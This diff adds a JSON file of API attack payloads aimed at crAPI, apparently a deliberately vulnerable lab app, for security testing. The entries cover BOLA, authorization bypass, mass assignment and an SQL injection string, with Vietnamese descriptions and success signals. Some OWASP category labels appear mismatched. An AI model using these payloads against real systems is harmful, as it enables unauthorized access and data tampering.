@@ -1,0 +1,96 @@
+{
+  "payloads": [
+    {
+      "endpoint": "/community/api/v2/community/posts/{postId}",
+      "method": "GET",
+      "target_param": "postId",
+      "param_location": "path",
+      "attack_type": "BOLA",
+      "payload_value": "00000000-0000-0000-0000-000000000001",
+      "owasp_category": "API1:2023 BOLA",
+      "context": "Thay thế postId bằng UUID của người dùng khác để kiểm tra quyền truy cập bài viết riêng tư.",
+      "expected_signal": [
+        "content",
+        "title",
+        "author"
+      ],
+      "target_app": "crapi"
+    },
+    {
+      "endpoint": "/identity/api/v2/admin/videos/{video_id}",
+      "method": "DELETE",
+      "target_param": "video_id",
+      "param_location": "path",
+      "attack_type": "AUTH_BYPASS",
+      "payload_value": "1",
+      "owasp_category": "API5:2023 Broken Function Level Authorization",
+      "context": "Gửi request xóa video quản trị từ tài khoản người dùng thường để kiểm tra phân quyền chức năng.",
+      "expected_signal": [
+        "success",
+        "deleted"
+      ],
+      "target_app": "crapi"
+    },
+    {
+      "endpoint": "/identity/api/auth/forget-password",
+      "method": "POST",
+      "target_param": "email",
+      "param_location": "body",
+      "attack_type": "SQL_INJECTION",
+      "payload_value": "admin@example.com' OR '1'='1",
+      "owasp_category": "API8:2023 Security Misconfiguration",
+      "context": "Chèn payload SQLi vào trường email trong chức năng quên mật khẩu để ép hệ thống xử lý logic bất thường.",
+      "expected_signal": [
+        "sql",
+        "syntax",
+        "error"
+      ],
+      "target_app": "crapi"
+    },
+    {
+      "endpoint": "/identity/api/v2/user/videos/{video_id}",
+      "method": "PUT",
+      "target_param": "id",
+      "param_location": "body",
+      "attack_type": "MASS_ASSIGNMENT",
+      "payload_value": 9999,
+      "owasp_category": "API6:2023 Unrestricted Access to Sensitive Business Flows",
+      "context": "Thử ghi đè trường id bên trong body request PUT để sửa đổi video của người dùng khác.",
+      "expected_signal": [
+        "success",
+        "updated"
+      ],
+      "target_app": "crapi"
+    },
+    {
+      "endpoint": "/identity/api/v2/vehicle/{vehicleId}/location",
+      "method": "GET",
+      "target_param": "vehicleId",
+      "param_location": "path",
+      "attack_type": "BOLA",
+      "payload_value": "9999",
+      "owasp_category": "API1:2023 BOLA",
+      "context": "Truy vấn ID phương tiện của người dùng khác qua path parameter để kiểm tra kiểm soát truy cập xe.",
+      "expected_signal": [
+        "latitude",
+        "longitude"
+      ],
+      "target_app": "crapi"
+    },
+    {
+      "endpoint": "/community/api/v2/coupon/new-coupon",
+      "method": "POST",
+      "target_param": "amount",
+      "param_location": "body",
+      "attack_type": "MASS_ASSIGNMENT",
+      "payload_value": 999999,
+      "owasp_category": "API3:2023 Object Property Level Authorization",
+      "context": "Truyền giá trị số tiền quá lớn vào coupon để khai thác lỗ hổng thiết lập định mức mã giảm giá.",
+      "expected_signal": [
+        "coupon_code",
+        "amount"
+      ],
+      "target_app": "crapi"
+    }
+  ]
+}
